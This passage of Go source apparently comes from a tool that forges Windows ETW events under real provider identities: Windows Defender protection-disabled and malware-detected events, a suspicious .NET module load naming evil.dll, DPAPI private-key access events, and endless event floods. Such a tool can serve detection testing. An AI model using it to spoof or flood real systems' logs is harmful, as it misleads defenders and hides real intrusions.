```go
func LogDefenderEvent(regHandle syscall.Handle, eventId uint16, productName, productVersion string, iteration int) {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = eventId
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16 // Operational channel
	eventDescriptor.Level = 4    // Informational
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0x8000000000000000 // Based on sample: 9223372036854775808

	eventData := []EventDataDescriptor{
		// ProductName (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(productName)))), Size: uint32((len(productName) + 1) * 2)},
		// ProductVersion (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(productVersion)))), Size: uint32((len(productVersion) + 1) * 2)},
	}

	eventTypeStr := "enabled"
	if eventId == 5001 {
		eventTypeStr = "disabled"
	}

	log.Printf("EventID: %d", eventId)
	log.Printf("ProductName: %s", productName)
	log.Printf("ProductVersion: %s", productVersion)
	log.Printf("Realtime protection %s", eventTypeStr)

	status, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	if status != 0 {
		log.Printf("Failed to write Windows Defender event %d: %s", eventId, GetWindowsErrorDescription(uint32(status)))
		return
	} else {
		log.Printf("Windows Defender Event %d (Realtime protection %s) %d written successfully.", eventId, eventTypeStr, iteration)
	}
}

func LogDefenderMalwareDetectedEvent1116(regHandle syscall.Handle, productName, productVersion, detectionID, detectionTime, unused, unused2, threatID, threatName, severityID, severityName, categoryID, categoryName, fwLink, statusCode, statusDescription, state, sourceID, sourceName, processName, detectionUser, unused3, path, originID, originName, executionID, executionName, typeID, typeName, preExecutionStatus, actionID, actionName, unused4, errorCode, errorDescription, unused5, postCleanStatus, additionalActionsID, additionalActionsString, remediationUser, unused6, securityIntelligenceVersion, engineVersion string) {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = 1116
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16 // Operational channel
	eventDescriptor.Level = 3    // Warning level (as per sample event)
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0x8000000000000000

	// Create event data descriptors for all 40 fields as per manifest
	eventData := []EventDataDescriptor{
		// ProductName (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(productName)))), Size: uint32((len(productName) + 1) * 2)},
		// ProductVersion (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(productVersion)))), Size: uint32((len(productVersion) + 1) * 2)},
		// DetectionID (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(detectionID)))), Size: uint32((len(detectionID) + 1) * 2)},
		// DetectionTime (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(detectionTime)))), Size: uint32((len(detectionTime) + 1) * 2)},
		// Unused (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(unused)))), Size: uint32((len(unused) + 1) * 2)},
		// Unused2 (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(unused2)))), Size: uint32((len(unused2) + 1) * 2)},
		// ThreatID (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(threatID)))), Size: uint32((len(threatID) + 1) * 2)},
		// ThreatName (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(threatName)))), Size: uint32((len(threatName) + 1) * 2)},
		// SeverityID (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(severityID)))), Size: uint32((len(severityID) + 1) * 2)},
		// SeverityName (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(severityName)))), Size: uint32((len(severityName) + 1) * 2)},
		// CategoryID (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(categoryID)))), Size: uint32((len(categoryID) + 1) * 2)},
		// CategoryName (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(categoryName)))), Size: uint32((len(categoryName) + 1) * 2)},
		// FWLink (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(fwLink)))), Size: uint32((len(fwLink) + 1) * 2)},
		// StatusCode (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(statusCode)))), Size: uint32((len(statusCode) + 1) * 2)},
		// StatusDescription (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(statusDescription)))), Size: uint32((len(statusDescription) + 1) * 2)},
		// State (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(state)))), Size: uint32((len(state) + 1) * 2)},
		// SourceID (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(sourceID)))), Size: uint32((len(sourceID) + 1) * 2)},
		// SourceName (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(sourceName)))), Size: uint32((len(sourceName) + 1) * 2)},
		// ProcessName (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(processName)))), Size: uint32((len(processName) + 1) * 2)},
		// DetectionUser (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(detectionUser)))), Size: uint32((len(detectionUser) + 1) * 2)},
		// Unused3 (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(unused3)))), Size: uint32((len(unused3) + 1) * 2)},
		// Path (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(path)))), Size: uint32((len(path) + 1) * 2)},
		// OriginID (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(originID)))), Size: uint32((len(originID) + 1) * 2)},
		// OriginName (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(originName)))), Size: uint32((len(originName) + 1) * 2)},
		// ExecutionID (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(executionID)))), Size: uint32((len(executionID) + 1) * 2)},
		// ExecutionName (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(executionName)))), Size: uint32((len(executionName) + 1) * 2)},
		// TypeID (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(typeID)))), Size: uint32((len(typeID) + 1) * 2)},
		// TypeName (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(typeName)))), Size: uint32((len(typeName) + 1) * 2)},
		// PreExecutionStatus (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(preExecutionStatus)))), Size: uint32((len(preExecutionStatus) + 1) * 2)},
		// ActionID (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(actionID)))), Size: uint32((len(actionID) + 1) * 2)},
		// ActionName (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(actionName)))), Size: uint32((len(actionName) + 1) * 2)},
		// Unused4 (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(unused4)))), Size: uint32((len(unused4) + 1) * 2)},
		// ErrorCode (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(errorCode)))), Size: uint32((len(errorCode) + 1) * 2)},
		// ErrorDescription (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(errorDescription)))), Size: uint32((len(errorDescription) + 1) * 2)},
		// Unused5 (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(unused5)))), Size: uint32((len(unused5) + 1) * 2)},
		// PostCleanStatus (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(postCleanStatus)))), Size: uint32((len(postCleanStatus) + 1) * 2)},
		// AdditionalActionsID (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(additionalActionsID)))), Size: uint32((len(additionalActionsID) + 1) * 2)},
		// AdditionalActionsString (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(additionalActionsString)))), Size: uint32((len(additionalActionsString) + 1) * 2)},
		// RemediationUser (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(remediationUser)))), Size: uint32((len(remediationUser) + 1) * 2)},
		// Unused6 (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(unused6)))), Size: uint32((len(unused6) + 1) * 2)},
		// SecurityintelligenceVersion (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(securityIntelligenceVersion)))), Size: uint32((len(securityIntelligenceVersion) + 1) * 2)},
		// EngineVersion (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(engineVersion)))), Size: uint32((len(engineVersion) + 1) * 2)},
	}

	log.Printf("EventID: 1116")
	log.Printf("ProductName: %s", productName)
	log.Printf("ProductVersion: %s", productVersion)
	log.Printf("ThreatName: %s", threatName)
	log.Printf("SeverityName: %s", severityName)
	log.Printf("DetectionUser: %s", detectionUser)
	log.Printf("Path: %s", path)

	status, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	if status != 0 {
		log.Printf("Failed to write Windows Defender malware detection event 1116: %s", GetWindowsErrorDescription(uint32(status)))
		return
	} else {
		log.Printf("Windows Defender Event 1116 (Malware detected: %s) written successfully.", threatName)
	}
}

func randomDefenderVersion() string {
	versions := []string{
		"4.18.25050.5",
		"4.18.24090.8",
		"4.18.24070.6",
		"4.18.24060.7",
		"4.18.24050.9",
		"4.18.24040.3",
		"4.18.24030.4",
		"4.18.24020.2",
		"4.18.24010.12",
		"4.18.23120.8",
		"4.18.23110.3",
		"4.18.23100.6",
		"4.18.23090.14",
		"4.18.23080.9",
		"4.18.23070.7",
	}
	return versions[rand.Intn(len(versions))]
}

```

`cmd/dotnet.go`:

```go
package cmd

import (
	"fmt"
	"log"
	"math/rand"
	"syscall"
	"unsafe"
)

var DotNetRuntimeProviderGuid = GUID{0xe13c0d23, 0xccbc, 0x4e12, [8]byte{0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4}}

func WriteDotNetEvent() {
	fmt.Println("Emitting .NET Runtime event...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&DotNetRuntimeProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register .NET Runtime provider: %d", status)
	}

	var activityId GUID
	hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
	if hr != 0 {
		log.Fatalf("Failed to create GUID: %d", hr)
	}

	procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

	moduleID := uint64(rand.Int63())
	assemblyID := uint64(rand.Int63())
	moduleFlags := uint32(rand.Intn(16))
	reserved1 := uint32(0)
	moduleILPath := randomDotNetPath()
	moduleNativePath := randomNativePath()
	clrInstanceID := uint16(rand.Intn(10))

	var managedPdbSignature GUID
	procCoCreateGuid.Call(uintptr(unsafe.Pointer(&managedPdbSignature)))
	managedPdbAge := uint32(rand.Intn(100))
	managedPdbBuildPath := randomPdbPath()

	var nativePdbSignature GUID
	procCoCreateGuid.Call(uintptr(unsafe.Pointer(&nativePdbSignature)))
	nativePdbAge := uint32(rand.Intn(100))
	nativePdbBuildPath := randomPdbPath()

	LogDotNetEvent(regHandle, moduleID, assemblyID, moduleFlags, reserved1, moduleILPath, moduleNativePath,
		clrInstanceID, managedPdbSignature, managedPdbAge, managedPdbBuildPath,
		nativePdbSignature, nativePdbAge, nativePdbBuildPath, 0)

	procEventUnregister.Call(uintptr(regHandle))
}

func WriteMaliciousDotNetEvent() {
	log.Println("Emitting malicious .NET Runtime event...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&DotNetRuntimeProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register .NET Runtime provider: %d", status)
	}

	var activityId GUID
	hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
	if hr != 0 {
		log.Fatalf("Failed to create GUID: %d", hr)
	}

	procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

	moduleID := uint64(0x1337DEADBEEF)
	assemblyID := uint64(0xCAFEBABE1337)
	moduleFlags := uint32(8) // Suspicious flags
	reserved1 := uint32(0)
	moduleILPath := "C:\\Users\\victim\\AppData\\Local\\Temp\\evil.dll"
	moduleNativePath := "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll"
	clrInstanceID := uint16(1)

	var managedPdbSignature GUID
	procCoCreateGuid.Call(uintptr(unsafe.Pointer(&managedPdbSignature)))
	managedPdbAge := uint32(1)
	managedPdbBuildPath := "C:\\MaliciousTools\\Kiwikatz\\x64\\Release\\evil.pdb"

	var nativePdbSignature GUID
	procCoCreateGuid.Call(uintptr(unsafe.Pointer(&nativePdbSignature)))
	nativePdbAge := uint32(1)
	nativePdbBuildPath := "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.pdb"

	log.Printf("Loading suspicious .NET module: %s", moduleILPath)

	LogDotNetEvent(regHandle, moduleID, assemblyID, moduleFlags, reserved1, moduleILPath, moduleNativePath,
		clrInstanceID, managedPdbSignature, managedPdbAge, managedPdbBuildPath,
		nativePdbSignature, nativePdbAge, nativePdbBuildPath, 0)

	procEventUnregister.Call(uintptr(regHandle))
}

func WriteSpamDotNetEvent() {
	log.Println("Emitting spam .NET Runtime events...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&DotNetRuntimeProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register .NET Runtime provider: %d", status)
	}

	for i := 0; i < 1337; i++ {
		var activityId GUID
		hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
		if hr != 0 {
			log.Fatalf("Failed to create GUID: %d", hr)
		}

		procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

		moduleID := uint64(rand.Int63())
		assemblyID := uint64(rand.Int63())
		moduleFlags := uint32(rand.Intn(16))
		reserved1 := uint32(0)
		moduleILPath := randomDotNetPath()
		moduleNativePath := randomNativePath()
		clrInstanceID := uint16(rand.Intn(10))

		var managedPdbSignature GUID
		procCoCreateGuid.Call(uintptr(unsafe.Pointer(&managedPdbSignature)))
		managedPdbAge := uint32(rand.Intn(100))
		managedPdbBuildPath := randomPdbPath()

		var nativePdbSignature GUID
		procCoCreateGuid.Call(uintptr(unsafe.Pointer(&nativePdbSignature)))
		nativePdbAge := uint32(rand.Intn(100))
		nativePdbBuildPath := randomPdbPath()

		LogDotNetEvent(regHandle, moduleID, assemblyID, moduleFlags, reserved1, moduleILPath, moduleNativePath,
			clrInstanceID, managedPdbSignature, managedPdbAge, managedPdbBuildPath,
			nativePdbSignature, nativePdbAge, nativePdbBuildPath, i)
	}

	procEventUnregister.Call(uintptr(regHandle))
}

func WriteInfiniteSpamDotNetEvent() {
	log.Println("Starting infinite .NET Runtime events... Press ESC to stop")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&DotNetRuntimeProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Printf("Failed to register .NET Runtime provider: %d", status)
		return
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	count := 0
	for {
		if IsEscapePressed() {
			log.Printf("Escape pressed. Sent %d .NET events.", count)
			break
		}

		var activityId GUID
		hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
		if hr != 0 {
			log.Printf("Failed to create GUID: %d, continuing...", hr)
			continue
		}

		procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

		moduleID := uint64(rand.Int63())
		assemblyID := uint64(rand.Int63())
		moduleFlags := uint32(rand.Intn(16))
		reserved1 := uint32(0)
		moduleILPath := randomDotNetPath()
		moduleNativePath := randomNativePath()
		clrInstanceID := uint16(rand.Intn(10))

		var managedPdbSignature GUID
		procCoCreateGuid.Call(uintptr(unsafe.Pointer(&managedPdbSignature)))
		managedPdbAge := uint32(rand.Intn(100))
		managedPdbBuildPath := randomPdbPath()

		var nativePdbSignature GUID
		procCoCreateGuid.Call(uintptr(unsafe.Pointer(&nativePdbSignature)))
		nativePdbAge := uint32(rand.Intn(100))
		nativePdbBuildPath := randomPdbPath()

		LogDotNetEvent(regHandle, moduleID, assemblyID, moduleFlags, reserved1, moduleILPath, moduleNativePath,
			clrInstanceID, managedPdbSignature, managedPdbAge, managedPdbBuildPath,
			nativePdbSignature, nativePdbAge, nativePdbBuildPath, count)

		count++
		if count%100 == 0 {
			log.Printf("Sent %d .NET events...", count)
		}
	}
}

func LogDotNetEvent(regHandle syscall.Handle, moduleID, assemblyID uint64, moduleFlags, reserved1 uint32,
	moduleILPath, moduleNativePath string, clrInstanceID uint16, managedPdbSignature GUID, managedPdbAge uint32,
	managedPdbBuildPath string, nativePdbSignature GUID, nativePdbAge uint32, nativePdbBuildPath string, iteration int) {

	var eventDescriptor EventDescriptor
	eventDescriptor.Id = 152 // LoaderModuleLoad Event ID
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16 // Operational channel
	eventDescriptor.Level = 4    // Informational
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0x0000000000000008 // .NET Runtime keyword

	eventData := []EventDataDescriptor{
		// ModuleID (win:UInt64)
		{Ptr: uint64(uintptr(unsafe.Pointer(&moduleID))), Size: uint32(unsafe.Sizeof(moduleID))},
		// AssemblyID (win:UInt64)
		{Ptr: uint64(uintptr(unsafe.Pointer(&assemblyID))), Size: uint32(unsafe.Sizeof(assemblyID))},
		// ModuleFlags (win:UInt32)
		{Ptr: uint64(uintptr(unsafe.Pointer(&moduleFlags))), Size: uint32(unsafe.Sizeof(moduleFlags))},
		// Reserved1 (win:UInt32)
		{Ptr: uint64(uintptr(unsafe.Pointer(&reserved1))), Size: uint32(unsafe.Sizeof(reserved1))},
		// ModuleILPath (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(moduleILPath)))), Size: uint32((len(moduleILPath) + 1) * 2)},
		// ModuleNativePath (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(moduleNativePath)))), Size: uint32((len(moduleNativePath) + 1) * 2)},
		// ClrInstanceID (win:UInt16)
		{Ptr: uint64(uintptr(unsafe.Pointer(&clrInstanceID))), Size: uint32(unsafe.Sizeof(clrInstanceID))},
		// ManagedPdbSignature (win:GUID)
		{Ptr: uint64(uintptr(unsafe.Pointer(&managedPdbSignature))), Size: uint32(unsafe.Sizeof(managedPdbSignature))},
		// ManagedPdbAge (win:UInt32)
		{Ptr: uint64(uintptr(unsafe.Pointer(&managedPdbAge))), Size: uint32(unsafe.Sizeof(managedPdbAge))},
		// ManagedPdbBuildPath (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(managedPdbBuildPath)))), Size: uint32((len(managedPdbBuildPath) + 1) * 2)},
		// NativePdbSignature (win:GUID)
		{Ptr: uint64(uintptr(unsafe.Pointer(&nativePdbSignature))), Size: uint32(unsafe.Sizeof(nativePdbSignature))},
		// NativePdbAge (win:UInt32)
		{Ptr: uint64(uintptr(unsafe.Pointer(&nativePdbAge))), Size: uint32(unsafe.Sizeof(nativePdbAge))},
		// NativePdbBuildPath (win:UnicodeString)
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(nativePdbBuildPath)))), Size: uint32((len(nativePdbBuildPath) + 1) * 2)},
	}

	log.Printf("ModuleID: 0x%X", moduleID)
	log.Printf("AssemblyID: 0x%X", assemblyID)
	log.Printf("ModuleFlags: %d", moduleFlags)
	log.Printf("ModuleILPath: %s", moduleILPath)
	log.Printf("ModuleNativePath: %s", moduleNativePath)
	log.Printf("ClrInstanceID: %d", clrInstanceID)

	status, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	if status != 0 {
		log.Printf("Failed to write .NET Runtime event: %s", GetWindowsErrorDescription(uint32(status)))
		return
	} else {
		log.Printf(".NET Runtime Event %d written successfully.", iteration)
	}
}

func randomDotNetPath() string {
	paths := []string{

```

`cmd/dpapi.go`:

```go
package cmd

import (
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

// parseGUID is a quick helper to parse a string of the form
// "{a110d38c-ad18-4912-9f6c-e884a4bae796}" into a [16]byte
// in the standard Windows memory layout (little-endian for Data1,2,3).
func parseGUID(s string) ([16]byte, error) {
	s = strings.Trim(s, "{}")
	parts := strings.Split(s, "-")
	if len(parts) != 5 {
		return [16]byte{}, fmt.Errorf("GUID string %q not in expected format (8-4-4-4-12)", s)
	}

	data1, err := strconv.ParseUint(parts[0], 16, 32)
	if err != nil {
		return [16]byte{}, err
	}
	data2, err := strconv.ParseUint(parts[1], 16, 16)
	if err != nil {
		return [16]byte{}, err
	}
	data3, err := strconv.ParseUint(parts[2], 16, 16)
	if err != nil {
		return [16]byte{}, err
	}

	// Next part: 2 bytes in hex
	data4part1, err := strconv.ParseUint(parts[3], 16, 16)
	if err != nil {
		return [16]byte{}, err
	}
	// Last part: 6 bytes in hex
	data4part2, err := strconv.ParseUint(parts[4], 16, 48)
	if err != nil {
		return [16]byte{}, err
	}

	var g GUID
	// Fill Data1..Data3 as little-endian
	binary.LittleEndian.PutUint32((*[4]byte)(unsafe.Pointer(&g.Data1))[:], uint32(data1))
	binary.LittleEndian.PutUint16((*[2]byte)(unsafe.Pointer(&g.Data2))[:], uint16(data2))
	binary.LittleEndian.PutUint16((*[2]byte)(unsafe.Pointer(&g.Data3))[:], uint16(data3))

	// data4part1 => 2 bytes; data4part2 => 6 bytes
	b2 := make([]byte, 2)
	binary.BigEndian.PutUint16(b2, uint16(data4part1))
	b6 := make([]byte, 6)
	for i := 5; i >= 0; i-- {
		b6[i] = byte(data4part2 & 0xFF)
		data4part2 >>= 8
	}
	copy(g.Data4[:2], b2)
	copy(g.Data4[2:], b6)

	return *(*[16]byte)(unsafe.Pointer(&g)), nil
}

func WriteDPAPIEvent() {
	// The Microsoft-Windows-Crypto-DPAPI provider:
	dpapiProviderGUID := GUID{
		Data1: 0x89FE8F40,
		Data2: 0xCDCE,
		Data3: 0x464E,
		Data4: [8]byte{0x82, 0x17, 0x15, 0xEF, 0x97, 0xD4, 0xC7, 0xC3},
	}

	var regHandle syscall.Handle

	hr, _, _ := procEventRegister.Call(
		uintptr(unsafe.Pointer(&dpapiProviderGUID)),
		0,
		0,
		uintptr(unsafe.Pointer(&regHandle)),
	)
	if hr != 0 {
		log.Fatalf("Failed to register provider: %d", hr)
	}

	log.Printf("Emitting DPAPI events for accessing private key properties and private key data")

	// According to your reference event, we want:
	// TaskName: DPAPIDefInformationTaskMessage -> Task=1
	// Keywords: 2305843009213694016 decimal -> 0x2000000000000040 hex
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = 16385
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16 // as shown in your reference
	eventDescriptor.Level = 4    // = Information or Verbose, depends on manifest
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 1                     // so the manifest resolves to DPAPIDefInformationTaskMessage
	eventDescriptor.Keyword = 0x2000000000000040 // matches the reference event

	// Values to log (use your real values as needed):
	operationType := "SPCryptUnprotect"
	dataDescription1 := "Private Key Properties"
	masterKeyStr := "{a110d38c-ad18-4912-9f6c-e884a4bae796}"
	flags := uint32(1)
	protectionFlags := uint32(4)
	returnValue := uint32(0)
	callerProcessStartKey := uint64(2251799813704456)
	callerProcessID := uint32(os.Getpid())
	callerProcessCreationTime := uint64(133845414887248369)
	plainTextDataSize1 := uint32(50)

	// Convert strings to UTF-16
	operationTypeUTF16, _ := syscall.UTF16FromString(operationType)
	dataDescription1UTF16, _ := syscall.UTF16FromString(dataDescription1)
	// Convert GUID to raw 16 bytes
	masterKeyGUIDBytes, err := parseGUID(masterKeyStr)
	if err != nil {
		log.Fatalf("parseGUID failed: %v", err)
	}

	// Build numeric fields as little-endian buffers
	flagsBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(flagsBuf, flags)
	protectionFlagsBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(protectionFlagsBuf, protectionFlags)
	returnValueBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(returnValueBuf, returnValue)
	startKeyBuf := make([]byte, 8)
	binary.LittleEndian.PutUint64(startKeyBuf, callerProcessStartKey)
	pidBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(pidBuf, callerProcessID)
	creationTimeBuf := make([]byte, 8)
	binary.LittleEndian.PutUint64(creationTimeBuf, callerProcessCreationTime)
	plainTextSizeBuf1 := make([]byte, 4)
	binary.LittleEndian.PutUint32(plainTextSizeBuf1, plainTextDataSize1)

	// The manifest order is:
	// 1) OperationType (STRINGW)
	// 2) DataDescription (STRINGW)
	// 3) MasterKeyGUID (GUID)
	// 4) Flags (UINT32)
	// 5) ProtectionFlags (UINT32)
	// 6) ReturnValue (UINT32)
	// 7) CallerProcessStartKey (UINT64)
	// 8) CallerProcessID (UINT32)
	// 9) CallerProcessCreationTime (UINT64)
	// 10) PlainTextDataSize (UINT32)
	eventData1 := []EventDataDescriptor{
		// 1) OperationType
		{
			Ptr:  uint64(uintptr(unsafe.Pointer(&operationTypeUTF16[0]))),
			Size: uint32(len(operationTypeUTF16) * 2),
		},
		// 2) DataDescription
		{
			Ptr:  uint64(uintptr(unsafe.Pointer(&dataDescription1UTF16[0]))),
			Size: uint32(len(dataDescription1UTF16) * 2),
		},
		// 3) MasterKeyGUID
		{
			Ptr:  uint64(uintptr(unsafe.Pointer(&masterKeyGUIDBytes[0]))),
			Size: 16,
		},
		// 4) Flags
		{
			Ptr:  uint64(uintptr(unsafe.Pointer(&flagsBuf[0]))),
			Size: 4,
		},
		// 5) ProtectionFlags
		{
			Ptr:  uint64(uintptr(unsafe.Pointer(&protectionFlagsBuf[0]))),
			Size: 4,
		},
		// 6) ReturnValue
		{
			Ptr:  uint64(uintptr(unsafe.Pointer(&returnValueBuf[0]))),
			Size: 4,
		},
		// 7) CallerProcessStartKey
		{
			Ptr:  uint64(uintptr(unsafe.Pointer(&startKeyBuf[0]))),
			Size: 8,
		},
		// 8) CallerProcessID
		{
			Ptr:  uint64(uintptr(unsafe.Pointer(&pidBuf[0]))),
			Size: 4,
		},
		// 9) CallerProcessCreationTime
		{
			Ptr:  uint64(uintptr(unsafe.Pointer(&creationTimeBuf[0]))),
			Size: 8,
		},
		// 10) PlainTextDataSize
		{
			Ptr:  uint64(uintptr(unsafe.Pointer(&plainTextSizeBuf1[0]))),
			Size: 4,
		},
	}

	// Write the first event
	status, _, _ := procEventWrite.Call(
		uintptr(regHandle),
		uintptr(unsafe.Pointer(&eventDescriptor)),
		uintptr(len(eventData1)),
		uintptr(unsafe.Pointer(&eventData1[0])),
	)
	if status != 0 {
		log.Printf("Failed to write DPAPI event 1: %s", GetWindowsErrorDescription(uint32(status)))
		return
	}

	// Second event (just using "Private Key" as DataDescription, size=795, etc.)
	dataDescription2 := "Private Key"
	dataDescription2UTF16, _ := syscall.UTF16FromString(dataDescription2)
	plainTextDataSize2 := uint32(795)
	plainTextSizeBuf2 := make([]byte, 4)
	binary.LittleEndian.PutUint32(plainTextSizeBuf2, plainTextDataSize2)

	eventData2 := []EventDataDescriptor{
		{ // 1) OperationType
			Ptr:  uint64(uintptr(unsafe.Pointer(&operationTypeUTF16[0]))),
			Size: uint32(len(operationTypeUTF16) * 2),
		},
		{ // 2) DataDescription
			Ptr:  uint64(uintptr(unsafe.Pointer(&dataDescription2UTF16[0]))),
			Size: uint32(len(dataDescription2UTF16) * 2),
		},
		{ // 3) MasterKeyGUID
			Ptr:  uint64(uintptr(unsafe.Pointer(&masterKeyGUIDBytes[0]))),
			Size: 16,
		},
		{ // 4) Flags
			Ptr:  uint64(uintptr(unsafe.Pointer(&flagsBuf[0]))),
			Size: 4,
		},
		{ // 5) ProtectionFlags
